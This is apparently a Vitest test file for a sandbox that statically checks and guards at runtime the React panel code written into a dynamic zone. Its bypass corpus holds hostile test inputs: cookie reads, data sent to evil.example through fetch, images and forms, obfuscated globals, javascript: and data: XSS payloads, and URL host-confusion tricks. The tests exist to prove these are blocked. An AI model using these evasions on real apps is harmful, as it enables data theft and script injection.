import * as esbuild from 'esbuild-wasm'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { cssRules, decodeMappings, parseProtected, staticCheck, type CheckContext, type TransformFn } from '../src/check.js'
import { isComponentExport } from '../src/component.js'
import { allowedHostUrl, guardModule, guardProps, normalizeAllowedHosts, sameOriginUrl, type PageOrigin } from '../src/url-guard.js'
import { installExternals } from '../src/loader.js'
import { scopeZoneCss, layeredCss } from '../src/css-scope.js'
import { isWritablePath, validateZoneGlob } from '../src/paths.js'

const transform: TransformFn = (s, o) => esbuild.transform(s, o)
const ctx: CheckContext = { dynamicRoots: ['src/dynamic/'], externals: [], externalPatterns: ['react', 'react/jsx-runtime', '@/components/ui/*', '@/lib/utils', '@/readonly/*'] }
const rules = async (body: string, extra: Partial<CheckContext> = {}, file = 'src/dynamic/panel.tsx') =>
  (await staticCheck({ [file]: body }, { ...ctx, ...extra }, transform)).map((e) => e.rule)
const inPanel = (code: string) => `export default function P({ data }: { data: any }) { ${code}; return null }`

describe('static check: the bypass corpus (code review 06 §2 test 4, brainstorm 04 §7, 05 #1)', () => {
  it.each([
    ['protocol-relative fetch via template', 'const x = data.host; fetch(`/${x}`)', 'no-computed-url'],
    ['backslash host', "fetch('/\\\\evil.example/x')", 'no-remote-request'],
    ['fetch aliased', 'const f = fetch; f("https://evil")', 'no-remote-request'],
    ['fetch.call', "fetch.call(null, 'https://evil')", 'no-remote-request'],
    ['window.fetch aliased', 'const f = window.fetch', 'no-remote-request'],
    ['new Image().src', "new Image().src = 'https://evil.example/?' + data", 'no-remote-request'],
    ['element.src assignment', "const img = document.getElementById('x') as any; img.src = 'https://evil.example/p.gif'", 'no-remote-request'],
    ['setAttribute src', "document.body.setAttribute('src', 'https://evil.example')", 'no-remote-request'],
    ['location.href =', "location.href = 'https://evil.example'", 'no-navigation'],
    ['location.assign', "window.location.assign('https://evil.example')", 'no-navigation'],
    ['location aliased', 'const l = location; l.href = "x"', 'no-navigation'],
    ['window.open', "window.open('https://evil.example')", 'no-navigation'],
    ['computed member on window', 'const k = "fe" + "tch"; (window as any)[k]("x")', 'no-computed-global'],
    ['globalThis[atob]', "(globalThis as any)[atob('ZmV0Y2g=')]('https://evil')", 'no-computed-global'],
    ["document['coo'+'kie'] (esbuild folds it)", "const c = (document as any)['coo' + 'kie']", 'no-document-cookie'],
    ['document[computed]', 'const c = (document as any)[data.k]', 'no-computed-global'],
    ['destructured cookie', 'const { cookie } = document', 'no-global-alias'],
    ['document aliased', 'const d = document; d.title', 'no-global-alias'],
    ['localStorage', "localStorage.setItem('k', 'v')", 'no-storage'],
    ['window.sessionStorage', "window.sessionStorage.getItem('k')", 'no-storage'],
    ['indexedDB', "indexedDB.open('x')", 'no-storage'],
    ['[].constructor.constructor', "[].constructor.constructor('return 1')()", 'no-constructor-access'],
    ['window.top', 'window.top!.postMessage(data, "*")', 'no-cross-window'],
    ['parent postMessage', 'parent.postMessage(data, "*")', 'no-cross-window'],
    ['new Worker', "new Worker('/w.js')", 'no-worker'],
    ['createElement script', "document.createElement('script')", 'no-raw-html'],
    ['React.createElement', "const React: any = {}; React.createElement('img', { src: 'https://evil' })", 'no-raw-html'],
    ['style url() absolute', "const s = { backgroundImage: 'url(https://evil.example/p.png)' }", 'no-remote-css'],
    ['style url() computed', 'const s = { backgroundImage: `url(${data.u})` }', 'no-remote-css'],
    ['Tailwind bg-[url()]', "const cls = 'bg-[url(https://evil.example/p.png)] p-2'", 'no-remote-css'],
    ['string timer via window', "window.setTimeout('alert(1)', 1)", 'no-string-timer'],
  ])('%s', async (_name, code, rule) => {
    expect(await rules(inPanel(code))).toContain(rule)
  })

  it.each([
    ['img src absolute', '<img src="https://evil.example/p.png" />', 'no-remote-request'],
    ['iframe src', '<iframe src="https://evil.example" />', 'no-remote-request'],
    ['link href', '<link rel="stylesheet" href="//evil.example/x.css" />', 'no-remote-request'],
    ['form action', '<form action="https://evil.example/collect"><input name="x" /></form>', 'no-remote-request'],
    ['button formAction', '<button formAction="https://evil.example">x</button>', 'no-remote-request'],
    ['javascript: href', '<a href="javascript:alert(1)">x</a>', 'no-computed-url'],
    ['obfuscated javascript: href', '<a href={" jav\\tascript:alert(1)"}>x</a>', 'no-computed-url'],
    ['a href: computed after a fixed absolute start', '<a href={"https://evil.example/" + data.id}>x</a>', 'no-remote-request'],
    ['a href: computed after a fixed protocol-relative start', '<a href={"//" + data.host}>x</a>', 'no-remote-request'],
    ['a href: computed after a fixed javascript: start', '<a href={`javascript:${data.code}`}>x</a>', 'no-computed-url'],
    ['a URL from data on a component (no runtime guard there)', '<Avatar src={data.avatar} />', 'no-computed-url'],
    ['srcSet from data (a list: not guarded statically)', '<img srcSet={data.set} />', 'no-computed-url'],
    ['ping from data', '<a href="/x" ping={data.tracker}>x</a>', 'no-computed-url'],
    ['srcDoc', '<iframe srcDoc="<script>1</script>" />', 'no-raw-html'],
    ['script tag', '<script>{"x"}</script>', 'no-raw-html'],
    ['style tag', '<style>{"body{display:none}"}</style>', 'no-raw-html'],
    ['object tag', '<object data="https://evil.example/x" />', 'no-raw-html'],
    ['data on an element', '<x-viewer data={data.url} />', 'no-computed-url'],
    ['data on an element, absolute', '<x-viewer data="https://evil.example/x" />', 'no-remote-request'],
    ['inline style url', `<div style={{ background: 'url(//evil.example/p.png)' }} />`, 'no-remote-css'],
  ])('JSX: %s', async (_name, jsx, rule) => {
    expect(await rules(`export default function P({ data }: { data: any }) { return <>${jsx}</> }`)).toContain(rule)
  })

  it('keeps ordinary panel code clean', async () => {
    const ok = `import { useState } from 'react'
import { Button } from '@/components/ui/button'
const Chart = (p: { data: unknown[] }) => <div>{p.data.length}</div>
export default function P({ data }: { data: { id: string; parent?: string } }) {
  const [open, setOpen] = useState(false)
  const parent = data.parent
  const path = location.pathname
  if (typeof window !== 'undefined') window.addEventListener('resize', () => setOpen(false))
  const counts: Record<string, number> = {}
  counts[data.id] = 1
  fetch('/api/customers/' + data.id)
  fetch(\`/api/deals/\${data.id}\`)
  return (
    <div className="bg-[url(/img/bg.png)] p-2" style={{ color: 'red' }}>
      <a href={\`/customers/\${data.id}\`}>open</a>
      <a href="mailto:support@example.com">mail</a>
      <a href="#top">top</a>
      <img src="/logo.png" alt="" />
      <Button onClick={() => setOpen(!open)}>{parent}{path}</Button>
      <Chart data={[data]} />
    </div>
  )
}`
    expect(await rules(ok)).toEqual([])
  })

  it('maps positions back to the TypeScript source line', async () => {
    const src = `type A = { x: number }\ninterface B { y: string }\nexport default function P(): null {\n  const a: A = { x: 1 }\n  localStorage.getItem('k')\n  return null\n}`
    const [e] = await staticCheck({ 'src/dynamic/p.tsx': src }, ctx, transform)
    expect(e).toMatchObject({ line: 5, rule: 'no-storage' })
  })

  it('checks CSS files of the zone: remote url(), @import, global and pleatkit selectors', () => {
    const r = (css: string) => cssRules('src/dynamic/x.css', css, {}).map((e) => e.rule)
    expect(r('.card { background: url(https://evil.example/a.png) }')).toEqual(['no-remote-css'])
    expect(r('.card { background: url("//evil.example/a.png") }')).toEqual(['no-remote-css'])
    expect(r('@import "https://evil.example/x.css";')).toEqual(['no-remote-css'])
    expect(r('body { display: none }')).toEqual(['no-global-css'])
    expect(r(':root { --x: 1 }')).toEqual(['no-global-css'])
    expect(r('.mk-root { display: none }')).toEqual(['no-global-css'])
    expect(r('.card { background: url(/img/a.png); color: red } @media (max-width: 600px) { .card { padding: 0 } }')).toEqual([])
    expect(r('.card { background: url(data:image/png;base64,AAAA) }')).toEqual([])
  })

  it('CSS files are checked by staticCheck too', async () => {
    const errs = await staticCheck({ 'src/dynamic/x.css': 'html { background: url(https://evil.example) }' }, ctx, transform)
    expect(errs.map((e) => e.rule).sort()).toEqual(['no-global-css', 'no-remote-css'])
  })
})

describe('protected elements (brainstorm 05 #20)', () => {
  const base = { 'src/dynamic/signup.tsx': `export default function S() { return <form><label data-consent>I agree</label><p className="legal text-sm">Terms</p></form> }` }
  const pctx = { ...ctx, protected: ['[data-consent]', '.legal'], base }
  it('parses attribute, class and id selectors', () => {
    expect(parseProtected(['[data-consent]', '[data-x="1"]', '.legal', '#terms', 'div > p'])).toHaveLength(4)
  })
  it('refuses removing or hiding a protected element, allows other changes', async () => {
    const check = async (src: string) => (await staticCheck({ 'src/dynamic/signup.tsx': src }, pctx, transform)).map((e) => e.rule)
    expect(await check(`export default function S() { return <form className="p-4"><label data-consent>I agree</label><p className="legal text-sm">Terms</p></form> }`)).toEqual([])
    expect(await check(`export default function S() { return <form><p className="legal">Terms</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent hidden>I agree</label><p className="legal">T</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent style={{ opacity: 0 }}>I agree</label><p className="legal">T</p></form> }`)).toEqual(['protected-element'])
    expect(await check(`export default function S() { return <form><label data-consent>I agree</label><p className="legal sr-only">T</p></form> }`)).toEqual(['protected-element'])
  })
  it('refuses CSS aimed at a protected element and removing its file', async () => {
    const errs = await staticCheck({ 'src/dynamic/x.css': '[data-consent] { display: none }' }, pctx, transform)
    expect(errs.map((e) => e.rule)).toContain('protected-element')
  })
})

describe('default exports: one rule for browser and server', () => {
  const panel = 'src/dynamic/p.tsx'
  const kind = async (src: string, files: Record<string, string> = {}) => (await staticCheck({ [panel]: src, ...files }, ctx, transform, { components: [panel] })).filter((e) => e.rule === 'default-export').length
  it.each([
    ['function', 'export default function P() { return null }', 0],
    ['arrow const', 'const P = () => null\nexport default P', 0],
    ['memo call', "import { memo } from 'react'\nexport default memo(() => null)", 0],
    ['re-export', "export { default } from './q'", 0],
    ['number', 'export default 42', 1],
    ['string', "export default 'x'", 1],
    ['plain object', 'export default {}', 1],
    ['const number', 'const n = 1\nexport default n', 1],
    ['named only', 'export function P() { return null }', 1],
  ])('%s', async (_n, src, errors) => {
    expect(await kind(src, { 'src/dynamic/q.tsx': 'export default function Q() { return null }' })).toBe(errors)
  })
  it('the runtime check agrees on evaluated values', () => {
    expect(isComponentExport(() => null)).toBe(true)
    expect(isComponentExport({ $$typeof: Symbol.for('react.memo'), type: () => null })).toBe(true)
    expect(isComponentExport(42)).toBe(false)
    expect(isComponentExport({})).toBe(false)
  })
})

describe('paths and CSS scoping', () => {
  it('refuses Windows paths and traversal, validates zone globs', () => {
    expect(isWritablePath('src/dynamic/a.tsx', ['src/dynamic/'])).toBe(true)
    expect(isWritablePath('src\\dynamic\\a.tsx', ['src/dynamic/'])).toBe(false)
    expect(isWritablePath('src/dynamic/../core/a.tsx', ['src/dynamic/'])).toBe(false)
    expect(isWritablePath('/src/dynamic/a.tsx', ['src/dynamic/'])).toBe(false)
    expect(validateZoneGlob('./src/dynamic/**')).toEqual({ glob: 'src/dynamic/**', problems: [] })
    expect(validateZoneGlob('src\\dynamic\\**').problems).toHaveLength(1)
    expect(validateZoneGlob('/abs/src/**').problems.length).toBeGreaterThan(0)
    expect(validateZoneGlob('**/*.tsx').problems.length).toBeGreaterThan(0)
  })
  it('scopes zone CSS to panels and layers edit CSS under the host', () => {
    const scoped = scopeZoneCss('@keyframes spin { to { transform: rotate(1turn) } }\nbody { display: none }\n.card { color: red }')
    expect(scoped).toMatch(/^@keyframes spin/)
    expect(scoped).toContain('@scope ([data-pleatkit-id]) {\nbody { display: none }\n.card { color: red }\n}')
    const layered = layeredCss('@property --tw-x { syntax: "*"; inherits: false }\n@layer utilities { .p-2 { padding: 8px } }')
    expect(layered.startsWith('@property --tw-x')).toBe(true)
    expect(layered).toContain('@layer pleatkit-edits {\n@layer utilities')
  })
  it('decodes source maps', () => {
    expect(decodeMappings('AAAA;AACA')[1]![0]).toEqual([0, 1, 0])
  })
})

describe('DECISIONS 74.3: a URL from data stays on the app (static rule + runtime guard)', () => {
  const page: PageOrigin = { origin: 'https://app.example', base: 'https://app.example/users/list' }
  afterEach(() => vi.unstubAllGlobals())

  it('statically: a URL from data on a plain element is left to the runtime guard; assignments, setAttribute and fetch stay refused', async () => {
    const panel = (jsx: string) => `export default function P({ data }: { data: any }) { return <>${jsx}</> }`
    expect(await rules(panel('<img src={data.avatar} alt="" />'))).toEqual([])
    expect(await rules(panel('<img src={`/avatars/${data.avatar}.png`} alt="" />'))).toEqual([])
    expect(await rules(panel('<a href={data.url}>open</a>'))).toEqual([])
    expect(await rules(panel('<a href={new URL(data.u, "https://evil.example").href}>x</a>'))).toEqual([])
    expect(await rules(panel('<a href={location.origin + data.path}>x</a>'))).toEqual([])
    expect(await rules(panel('<video poster={data.thumb} src={data.clip} />'))).toEqual([])
    expect(await rules(panel("<a href={'mailto:' + data.email}>mail</a>"))).toEqual([])
    expect(await rules(panel('<a href={`tel:${data.phone}`}>call</a>'))).toEqual([])
    expect(await rules(inPanel("const img = document.getElementById('x') as any; img.src = data.url"))).toContain('no-computed-url')
    expect(await rules(inPanel("document.body.setAttribute('href', data.url)"))).toContain('no-computed-url')
    expect(await rules(inPanel('fetch(data.url)'))).toContain('no-computed-url')
  })

  it.each([
    ['a relative path', '/avatars/01.png', true],
    ['a relative path without a slash', 'avatars/01.png', true],
    ['a parent path', '../x', true],
    ['a query', '?page=2', true],
    ['a fragment', '#top', true],
    ['the app itself, absolute', 'https://app.example/x', true],
    ['protocol-relative //host', '//evil.example/p.png', false],
    ['/\\host (read as //host)', '/\\evil.example/p.png', false],
    ['\\\\host', '\\\\evil.example/p.png', false],
    ['another host', 'https://evil.example/p.png', false],
    ['javascript:', 'javascript:alert(1)', false],
    ['JavaScript: in capitals', 'JAVASCRIPT:alert(1)', false],
    ['javascript: with a tab and leading spaces', '  java\tscript:alert(1)', false],
    ['javascript: with a leading control character', '\u0001javascript:alert(1)', false],
    ['data:', 'data:text/html,<script>alert(1)</script>', false],
    ['data: image', 'data:image/png;base64,AAAA', false],
    ['blob:', 'blob:https://evil.example/1', false],
    ['location.origin + "@host" (user info)', 'https://app.example@evil.example/', false],
    ['location.origin + ".host" (a longer host)', 'https://app.example.evil.example/', false],
    ['another port', 'https://app.example:8443/x', false],
    ['another scheme', 'http://app.example/x', false],
    ['new URL(x, "https://evil").href', new URL('x', 'https://evil.example').href, false],
  ])('runtime: %s', (_name, value, kept) => {
    expect(sameOriginUrl(value, page) === undefined).toBe(!kept)
  })

  it('runtime: encoded schemes are paths of this app, not schemes; mailto:/tel: only on links; an opaque page keeps nothing', () => {
    for (const v of ['java%73cript:alert(1)', '&#106;avascript:alert(1)', '%6A%61vascript:alert(1)']) {
      expect(sameOriginUrl(v, page)).toBe(v)
      expect(new URL(v, page.base).origin).toBe(page.origin)
    }
    expect(sameOriginUrl('mailto:ann@example.com', page, { mail: true })).toBe('mailto:ann@example.com')
    expect(sameOriginUrl('tel:+15551234', page, { mail: true })).toBe('tel:+15551234')
    expect(sameOriginUrl('mailto:ann@example.com', page)).toBeUndefined()
    const opaque = { origin: 'null', base: 'about:srcdoc' }
    expect(sameOriginUrl('/x', opaque)).toBeUndefined()
    expect(sameOriginUrl('javascript:alert(1)', opaque)).toBeUndefined()
    expect(sameOriginUrl({ toString: () => '/x' }, page)).toBeUndefined()
  })

  it('runtime: elements an edit creates lose off-origin URLs, raw HTML and off-origin styles; components are not touched', () => {
    vi.stubGlobal('location', { origin: page.origin, href: page.base })
    const seen: unknown[] = []
    const jsxRuntime = guardModule('react/jsx-runtime', { jsx: (_t: unknown, p: unknown) => seen.push(p), jsxs: (_t: unknown, p: unknown) => seen.push(p), Fragment: 'F' })
    const jsx = jsxRuntime.jsx as (t: unknown, p: unknown) => void
    jsx('img', { src: '//evil.example/p.png', alt: '' })
    jsx('a', { href: '/customers/1', children: 'x' })
    jsx('a', { href: 'mailto:ann@example.com' })
    jsx('img', { src: '/a.png', srcSet: '/a.png 1x, https://evil.example/b.png 2x' })
    jsx('div', { dangerouslySetInnerHTML: { __html: '<img src=x onerror=alert(1)>' }, style: { backgroundImage: 'url(//evil.example/p.png)', color: 'red' } })
    jsx('iframe', { srcDoc: '<script>1</script>' })
    const Avatar = () => null
    jsx(Avatar, { src: '//evil.example/p.png' })
    expect(seen).toEqual([
      { alt: '' },
      { href: '/customers/1', children: 'x' },
      { href: 'mailto:ann@example.com' },
      { src: '/a.png' },
      { style: { color: 'red' } },
      {},
      { src: '//evil.example/p.png' },
    ])
    expect(jsxRuntime.Fragment).toBe('F')
    expect(guardProps('img', { src: '/a.png' })).toEqual({ src: '/a.png' })
  })

  it('runtime: React.createElement / cloneElement (aliased or destructured past the static rules) and react-dom resource hints are guarded too', () => {
    vi.stubGlobal('location', { origin: page.origin, href: page.base })
    const created: unknown[] = []
    const createElement = (_t: unknown, p: unknown) => created.push(p)
    const cloneElement = (_e: unknown, p: unknown) => created.push(p)
    const react = guardModule('react', { createElement, cloneElement, default: { createElement, cloneElement, useState: 1 } })
    ;(react.createElement as typeof createElement)('a', { href: 'javascript:alert(1)' })
    ;(react.default as { createElement: typeof createElement }).createElement('img', { src: 'https://evil.example/p.gif' })
    ;(react.cloneElement as typeof cloneElement)({ type: 'img' }, { src: '//evil.example' })
    expect(created).toEqual([{}, {}, {}])
    expect((react.default as { useState: number }).useState).toBe(1)
    const loaded: unknown[] = []
    const dom = guardModule('react-dom', { preinit: (h: unknown) => loaded.push(h), preload: (h: unknown) => loaded.push(h), createPortal: 'P' })
    ;(dom.preinit as (h: string) => void)('https://evil.example/x.js')
    ;(dom.preload as (h: string) => void)('/fonts/a.woff2')
    expect(loaded).toEqual(['/fonts/a.woff2'])
    expect(dom.createPortal).toBe('P')
    expect(guardModule('lucide-react', { X: 1 })).toEqual({ X: 1 })
  })

  it('runtime: compiled bundles get the guarded modules from the externals registry', () => {
    vi.stubGlobal('location', { origin: page.origin, href: page.base })
    const seen: unknown[] = []
    const registry = installExternals({ 'react/jsx-runtime': { jsx: (_t: unknown, p: unknown) => seen.push(p), jsxs: () => null }, 'lucide-react': { X: 1 } }, 'guard-test')
    ;(registry.require('react/jsx-runtime') as { jsx: (t: unknown, p: unknown) => void }).jsx('a', { href: 'https://evil.example', children: 'x' })
    expect(seen).toEqual([{ children: 'x' }])
    expect((registry.require('lucide-react') as { X: number }).X).toBe(1)
  })
})

describe('DECISIONS 63.1: allowedHosts lets <img src> and <a href> reach listed hosts over https, nothing else', () => {
  const hosts = ['cdn.example.com', 'xn--bcher-kva.example']
  const page: PageOrigin = { origin: 'https://app.example', base: 'https://app.example/users/list' }
  const panel = (jsx: string) => `const Avatar = (p: any) => null\nexport default function P({ data }: { data: any }) { return <>${jsx}</> }`
  const withHosts = (body: string) => rules(body, { allowedHosts: hosts })
  const CDN = 'https://cdn.example.com/a.png'
  afterEach(() => vi.unstubAllGlobals())

  it.each([
    ['<img src> literal', `<img src="${CDN}" alt="" />`],
    ['<a href> literal', '<a href="https://cdn.example.com/docs?x=1#y">x</a>'],
    ['the host alone', '<a href="https://cdn.example.com">x</a>'],
    ['a punycode host as listed', '<img src="https://xn--bcher-kva.example/a.png" alt="" />'],
    ['a template after the host and its slash', '<img src={`https://cdn.example.com/${data.id}.png`} alt="" />'],
    ['"https://host/" + data', '<img src={"https://cdn.example.com/" + data.id} alt="" />'],
    ['a conditional of an allowed host and a relative path', `<img src={data.x ? "${CDN}" : "/b.png"} alt="" />`],
  ])('statically allowed: %s', async (_name, jsx) => {
    expect(await withHosts(panel(jsx))).toEqual([])
  })

  it.each([
    ['without allowedHosts', `<img src="${CDN}" alt="" />`, 'no-remote-request', []],
    ['a host not listed', '<img src="https://evil.example/a.png" alt="" />', 'no-remote-request', hosts],
    ['a longer host', '<img src="https://cdn.example.com.evil.example/a.png" alt="" />', 'no-remote-request', hosts],
    ['user info after the host (@evil)', '<img src="https://cdn.example.com@evil.example/a.png" alt="" />', 'no-remote-request', hosts],
    ['user info before the host', '<img src="https://evil.example@cdn.example.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['the host in the path', '<img src="https://evil.example/cdn.example.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['another port', '<img src="https://cdn.example.com:8443/a.png" alt="" />', 'no-remote-request', hosts],
    ['the default port written out (statically exact)', '<img src="https://cdn.example.com:443/a.png" alt="" />', 'no-remote-request', hosts],
    ['http:', '<img src="http://cdn.example.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['protocol-relative', '<img src="//cdn.example.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['upper case', '<img src="https://CDN.example.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['a trailing dot', '<img src="https://cdn.example.com./a.png" alt="" />', 'no-remote-request', hosts],
    ['percent-encoding in the host', '<img src="https://cdn%2Eexample.com/a.png" alt="" />', 'no-remote-request', hosts],
    ['an IDN written in Unicode', '<img src="https://bücher.example/a.png" alt="" />', 'no-remote-request', hosts],
    ['backslashes', String.raw`<img src={"https:\\cdn.example.com/a.png"} alt="" />`, 'no-remote-request', hosts],
    ['a backslash after the host', String.raw`<img src={"https://cdn.example.com\\@evil.example/"} alt="" />`, 'no-remote-request', hosts],
    ['a tab in the host', String.raw`<img src={"https://cdn.exa\tmple.com/a.png"} alt="" />`, 'no-remote-request', hosts],
    ['a leading space', `<img src=" ${CDN}" alt="" />`, 'no-remote-request', hosts],
    ['a leading control character', String.raw`<img src={"\u0001https://cdn.example.com/a.png"} alt="" />`, 'no-remote-request', hosts],
    ['a template glued to the host', '<img src={`https://cdn.example.com${data.path}`} alt="" />', 'no-remote-request', hosts],
    ['a concatenation glued to the host', '<img src={"https://cdn.example.com" + data.path} alt="" />', 'no-remote-request', hosts],
    ['<img srcSet>', `<img srcSet="${CDN} 2x" alt="" />`, 'no-remote-request', hosts],
    ['<video poster>', `<video poster="${CDN}" />`, 'no-remote-request', hosts],
    ['<video src>', '<video src="https://cdn.example.com/a.mp4" />', 'no-remote-request', hosts],
    ['<source src>', '<video><source src="https://cdn.example.com/a.mp4" /></video>', 'no-remote-request', hosts],
    ['<form action>', '<form action="https://cdn.example.com/post" />', 'no-remote-request', hosts],
    ['<button formAction>', '<button formAction="https://cdn.example.com/post" />', 'no-remote-request', hosts],
    ['<iframe src>', '<iframe src="https://cdn.example.com/x" />', 'no-remote-request', hosts],
    ['<link href>', '<link rel="preload" href="https://cdn.example.com/x.js" />', 'no-remote-request', hosts],
    ['<a ping>', '<a href="/x" ping="https://cdn.example.com/p">x</a>', 'no-remote-request', hosts],
    ['<a xlinkHref>', `<a xlinkHref="${CDN}">x</a>`, 'no-remote-request', hosts],
    ['<image href> (svg)', `<svg><image href="${CDN}" /></svg>`, 'no-remote-request', hosts],
    ['<img href> (not the attribute)', `<img href="${CDN}" alt="" />`, 'no-remote-request', hosts],
    ['a component prop', `<Avatar src="${CDN}" />`, 'no-remote-request', hosts],
    ['url() in style', `<div style={{ backgroundImage: "url(${CDN})" }} />`, 'no-remote-css', hosts],
    ['url() in a Tailwind class', `<div className="bg-[url(${CDN})]" />`, 'no-remote-css', hosts],
  ])('statically refused: %s', async (_name, jsx, rule, list) => {
    expect(await rules(panel(jsx), { allowedHosts: list })).toContain(rule)
  })

  it('statically refused: assignments, setAttribute, fetch, new Image, import() and CSS files keep refusing listed hosts', async () => {
    expect(await withHosts(inPanel(`const img = document.getElementById('x') as any; img.src = '${CDN}'`))).toContain('no-remote-request')
    expect(await withHosts(inPanel(`document.body.setAttribute('src', '${CDN}')`))).toContain('no-remote-request')
    expect(await withHosts(inPanel(`fetch('${CDN}')`))).toContain('no-remote-request')
    expect(await withHosts(inPanel(`new Image().src = '${CDN}'`))).toContain('no-remote-request')
    expect(await withHosts(inPanel(`import('https://cdn.example.com/x.js')`))).toContain('no-dynamic-import')
    expect(cssRules('src/dynamic/a.css', `.x { background: url(${CDN}) }`, {}).map((e) => e.rule)).toEqual(['no-remote-css'])
  })

  it.each([
    ['as written', CDN, CDN],
    ['the default port written out', 'https://cdn.example.com:443/a.png', CDN],
    ['upper case', 'https://CDN.Example.COM/a.png', CDN],
    ['protocol-relative on an https page', '//cdn.example.com/a.png', CDN],
    ['/\\host on an https page', '/\\cdn.example.com/a.png', CDN],
    ['a backslash for the path', 'https://cdn.example.com\\a.png', CDN],
    ['a backslash, then @evil (a path on the host)', 'https://cdn.example.com\\@evil.example/', 'https://cdn.example.com/@evil.example/'],
    ['a tab in the host (the browser strips it)', 'https://cdn.exa\tmple.com/a.png', CDN],
    ['surrounding whitespace', ' https://cdn.example.com/a.png\n', CDN],
    ['percent-encoding that decodes to the host', 'https://cdn%2Eexample.com/a.png', CDN],
    ['an IDN in Unicode, listed as punycode', 'https://bücher.example/a.png', 'https://xn--bcher-kva.example/a.png'],
  ])('runtime keeps (canonical): %s', (_name, value, canonical) => {
    expect(allowedHostUrl(value, hosts, page)).toBe(canonical)
    expect(guardProps('img', { src: value }, page, { allowedHosts: hosts })).toEqual({ src: canonical })
    expect(guardProps('a', { href: value }, page, { allowedHosts: hosts })).toEqual({ href: canonical })
  })

  it.each([
    ['http:', 'http://cdn.example.com/a.png'],
    ['user info after the host', 'https://cdn.example.com@evil.example/a.png'],
    ['user info before the host', 'https://evil.example@cdn.example.com/a.png'],
    ['user and password', 'https://u:p@cdn.example.com/a.png'],
    ['a longer host', 'https://cdn.example.com.evil.example/a.png'],
    ['the host in the path', 'https://evil.example/cdn.example.com/a.png'],
    ['the host in the query', 'https://evil.example/?u=https://cdn.example.com/'],
    ['another port', 'https://cdn.example.com:8443/a.png'],
    ['a trailing dot', 'https://cdn.example.com./a.png'],
    ['a comma in the host', 'https://cdn.example.com,evil.example/a.png'],
    ['an encoded @ in the host', 'https://cdn.example.com%40evil.example/'],
    ['an encoded / in the host', 'https://cdn.example.com%2F.evil.example/'],
    ['a backslash before @host', 'https://evil.example\\@cdn.example.com/'],
    ['a look-alike (Cyrillic a)', 'https://cdn.exаmple.com/a.png'],
    ['an IDN not listed', 'https://bucher.example/a.png'],
    ['javascript:', 'javascript:alert(1)'],
    ['data:', 'data:image/png;base64,AAAA'],
    ['blob: of the host', 'blob:https://cdn.example.com/1'],
    ['wss:', 'wss://cdn.example.com/'],
    ['a relative path (same origin, not a listed host)', '/a.png'],
  ])('runtime refuses as an external URL: %s', (_name, value) => {
    expect(allowedHostUrl(value, hosts, page)).toBeUndefined()
  })

  it('runtime: protocol-relative on an http page is http: and refused; without allowedHosts nothing external is kept', () => {
    const http: PageOrigin = { origin: 'http://app.example', base: 'http://app.example/' }
    expect(allowedHostUrl('//cdn.example.com/a.png', hosts, http)).toBeUndefined()
    expect(guardProps('img', { src: CDN }, page)).toEqual({})
    expect(guardProps('img', { src: CDN }, page, { allowedHosts: [] })).toEqual({})
    expect(allowedHostUrl(CDN, [], page)).toBeUndefined()
  })

  it('runtime: only <img src>/srcSet and <a href> get listed hosts; every other element and prop keeps the same-origin rule', () => {
    const g = (type: string, props: Record<string, unknown>) => guardProps(type, props, page, { allowedHosts: hosts })
    expect(g('img', { srcSet: `${CDN} 1x, https://cdn.example.com/b.png 2x`, alt: '' })).toEqual({ srcSet: `${CDN} 1x, https://cdn.example.com/b.png 2x`, alt: '' })
    expect(g('img', { srcSet: `/a.png 1x, ${CDN} 2x` })).toEqual({ srcSet: `/a.png 1x, ${CDN} 2x` })
    expect(g('img', { srcSet: `${CDN} 1x, https://evil.example/b.png 2x` })).toEqual({})
    // the HTML parser reads "https://cdn.example.com,evil.example/a.png" as one URL on another host
    expect(g('img', { srcSet: 'https://cdn.example.com,evil.example/a.png 2x' })).toEqual({})
    expect(g('img', { srcSet: `${CDN} 1x (, https://evil.example/b.png 2x)` })).toEqual({})
    expect(g('a', { href: CDN, ping: 'https://cdn.example.com/p', children: 'x' })).toEqual({ href: CDN, children: 'x' })
    for (const [type, props] of [
      ['video', { src: CDN, poster: CDN }],
      ['source', { src: CDN, srcSet: `${CDN} 2x` }],
      ['form', { action: CDN }],
      ['button', { formAction: CDN }],
      ['iframe', { src: CDN }],
      ['script', { src: CDN }],
      ['link', { href: CDN, imageSrcSet: `${CDN} 2x` }],
      ['image', { href: CDN }],
      ['a', { xlinkHref: CDN }],
      ['img', { href: CDN, data: CDN }],
      ['object', { data: CDN }],
    ] as [string, Record<string, unknown>][]) {
      expect(g(type, props), type).toEqual({})
    }
    expect(g('div', { style: { backgroundImage: `url(${CDN})`, color: 'red' } })).toEqual({ style: { color: 'red' } })
    expect(g('img', { src: 'http://cdn.example.com/a.png' })).toEqual({})
    const Avatar = () => null
    expect(g(Avatar as unknown as string, { src: CDN })).toEqual({ src: CDN })
  })

  it('runtime: an opaque page (isolated frame) keeps an absolute listed URL, still nothing relative', () => {
    const opaque: PageOrigin = { origin: 'null', base: 'about:srcdoc' }
    expect(guardProps('img', { src: CDN }, opaque, { allowedHosts: hosts })).toEqual({ src: CDN })
    expect(guardProps('img', { src: '/a.png' }, opaque, { allowedHosts: hosts })).toEqual({})
    expect(guardProps('img', { src: '//cdn.example.com/a.png' }, opaque, { allowedHosts: hosts })).toEqual({})
  })

  it('runtime: jsx, createElement, cloneElement and the externals registry carry the list; react-dom hints never get it', () => {
    vi.stubGlobal('location', { origin: page.origin, href: page.base })
    const seen: unknown[] = []
    const jsx = guardModule('react/jsx-runtime', { jsx: (_t: unknown, p: unknown) => seen.push(p), jsxs: () => null }, { allowedHosts: hosts }).jsx as (t: unknown, p: unknown) => void
    jsx('img', { src: 'https://CDN.example.com/a.png', alt: '' })
    jsx('video', { poster: CDN })
    const react = guardModule('react', { createElement: (_t: unknown, p: unknown) => seen.push(p), cloneElement: (_e: unknown, p: unknown) => seen.push(p) }, { allowedHosts: hosts })
    ;(react.createElement as (t: unknown, p: unknown) => void)('a', { href: CDN })
    ;(react.cloneElement as (e: unknown, p: unknown) => void)({ type: 'img' }, { src: CDN })
    ;(react.cloneElement as (e: unknown, p: unknown) => void)({ type: 'iframe' }, { src: CDN })
